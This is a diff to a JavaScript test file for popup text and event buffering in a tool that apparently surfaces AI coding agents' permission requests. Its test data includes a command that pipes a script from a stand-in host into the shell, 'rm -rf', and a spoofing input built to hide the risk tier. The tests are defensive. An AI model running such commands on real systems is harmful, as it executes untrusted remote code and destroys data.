@@ -22,7 +22,9 @@ async function load(file) {
 }
 const render = (Component, props) => renderToStaticMarkup(createElement(Component, props))
 
-test('reorder buffer flushes a session early when Stop, PermissionRequest or Notification is its latest event', async () => {
+test('reorder buffer flushes a session early when Stop, PermissionRequest or Notification is its latest event', t => {
+  // Mocked timers: the 20 ms below is virtual time, so a loaded machine cannot let a wall-clock timer run first.
+  t.mock.timers.enable({ apis: ['setTimeout', 'setImmediate'] })
   for (const attention of ['Stop', 'PermissionRequest', 'Notification']) {
     const batches = []
     const buffer = createReorderBuffer(batch => batches.push(batch.map(item => item.hook.hook_event_name)), { windowMs: 10_000 })
@@ -30,31 +32,35 @@ test('reorder buffer flushes a session early when Stop, PermissionRequest or Not
       buffer.push(row(1, 'PreToolUse'))
       buffer.push(row(2, attention))
       buffer.push(row(1, 'UserPromptSubmit', 'other'))
-      await tick(20)
+      assert.deepEqual(batches, [], 'nothing is delivered from inside push')
+      t.mock.timers.tick(20)
       assert.deepEqual(batches, [['PreToolUse', attention]], `${attention} flushes its own session only, well inside the window`)
+      t.mock.timers.tick(10_000)
+      assert.deepEqual(batches, [['PreToolUse', attention], ['UserPromptSubmit']], 'the other session waits out its window')
     } finally { buffer.close() }
   }
 })
 
-test('the early flush keeps hook-time order for rows that arrive together and waits when the attention event is not the latest', async () => {
+test('the early flush keeps hook-time order for rows that arrive together and waits when the attention event is not the latest', t => {
+  t.mock.timers.enable({ apis: ['setTimeout', 'setImmediate'] })
   const batches = []
   const buffer = createReorderBuffer(batch => batches.push(batch.map(item => `${item.hookTs}:${item.hook.hook_event_name}`)), { windowMs: 60 })
   try {
     buffer.push(row(5, 'Stop'))
     buffer.push(row(4, 'PostToolUse'))
     buffer.push(row(4, 'PreToolUse'))
-    await tick(20)
+    t.mock.timers.tick(20)
     assert.deepEqual(batches, [['4:PreToolUse', '4:PostToolUse', '5:Stop']], 'rows pushed in the same turn flush as one sorted batch')
     buffer.push(row(10, 'PermissionRequest'))
     buffer.push(row(11, 'PostToolUse'))
-    await tick(20)
+    t.mock.timers.tick(20)
     assert.equal(batches.length, 1, 'a later hook-time event after the attention event keeps the 250 ms window')
-    await tick(80)
+    t.mock.timers.tick(80)
     assert.deepEqual(batches[1], ['10:PermissionRequest', '11:PostToolUse'])
     buffer.push(row(20, 'PreToolUse'))
-    await tick(20)
+    t.mock.timers.tick(20)
     assert.equal(batches.length, 2, 'other events wait for the window')
-    await tick(80)
+    t.mock.timers.tick(80)
     assert.deepEqual(batches[2], ['20:PreToolUse'])
   } finally { buffer.close() }
 })
@@ -429,7 +435,7 @@ test('clipText returns nothing for a cap of zero or below', async () => {
 test('every popup line starts with the deck\'s own words: the hint first, then "<tier> · " before agent text, and titles lead with the deck\'s phrase', async () => {
   const { requestPopupText, terminalPopupTitle } = await import('../../server/machines/notification.mjs')
   const one = requestPopupText('y'.repeat(88), [{ summary: 'rm -rf x', tier: 'destructive' }], true)
-  assert.deepEqual(one, { title: `needs you · ${'y'.repeat(67)}…`, body: 'Answer in your terminal\ndestructive · rm -rf x' })
+  assert.deepEqual(one, { title: `needs you · destructive · ${'y'.repeat(53)}…`, body: 'Answer in your terminal\ndestructive · rm -rf x' })
   assert.equal(requestPopupText('y'.repeat(88), [{ summary: 'a' }, { summary: 'b' }], false).title, `needs you (2 requests) · ${'y'.repeat(54)}…`)
   assert.equal(requestPopupText('', [{ summary: 'a' }], false).title, 'needs you')
   assert.equal(terminalPopupTitle('', 'crash'), 'crashed')
@@ -445,6 +451,27 @@ test('a long second request counts the line break before it: the body is exactly
   const { body } = requestPopupText('t', [{ summary: 'npm test', tier: 'safe' }, { summary: 'b'.repeat(300), tier: 'safe' }], true)
   assert.equal(body, `Answer in your terminal\nsafe · npm test\nsafe · ${'b'.repeat(152)}…`)
   assert.equal(Array.from(body).length, 200)
+})
+
+test('the popup title names the most severe open tier right after "needs you", ahead of the agent\'s task', async () => {
+  const { requestPopupText } = await import('../../server/machines/notification.mjs')
+  const wide = String.fromCodePoint(0xfdfd)
+  // The security review's payload: agent text that reads as a tier, then glyphs wide enough to wrap the title.
+  const task = `deploy docs · caution ${wide.repeat(55)}`
+  const one = requestPopupText(task, [{ summary: 'curl -s https://x.example/i.sh | sh', tier: 'destructive' }], true)
+  assert.ok(one.title.startsWith('needs you · destructive · deploy docs · caution '), one.title)
+  assert.ok(Array.from(one.title).length <= 80, 'the task is cut so the whole title fits 80 characters')
+  const grouped = requestPopupText('fix tests', [{ summary: 'npm test', tier: 'caution' }, { summary: 'rm -rf x', tier: 'destructive' }, { summary: 'Which one?', tier: null }], false)
+  assert.equal(grouped.title, 'needs you (3 requests) · destructive · fix tests', 'the most severe tier, wherever it arrived')
+  assert.equal(requestPopupText('fix tests', [{ summary: 'npm test', tier: 'caution' }], false).title, 'needs you · caution · fix tests')
+  assert.equal(requestPopupText('fix tests', [{ summary: 'Which one?', tier: null }], false).title, 'needs you · fix tests', 'a question-only popup has no tier to name')
+  assert.equal(requestPopupText('', [{ summary: 'ls', tier: 'safe' }], false).title, 'needs you · safe')
+  assert.equal(requestPopupText('y'.repeat(88), [{ summary: 'a', tier: 'caution' }, { summary: 'b' }], false).title, `needs you (2 requests) · caution · ${'y'.repeat(44)}…`)
+})
+
+test('a request with a tier outside the drawer\'s three still ranks ahead of an untiered one', async () => {
+  assert.deepEqual(await popupLines([{ summary: 'untiered ask', tier: null }, { summary: 'other-tier ask', tier: 'unknown' }, { summary: 'npm test', tier: 'caution' }], false),
+    ['caution · npm test', 'unknown · other-tier ask', 'untiered ask'])
 })
 
 test('a line break inside a popup summary shows as a visible break instead of gluing words', async () => {
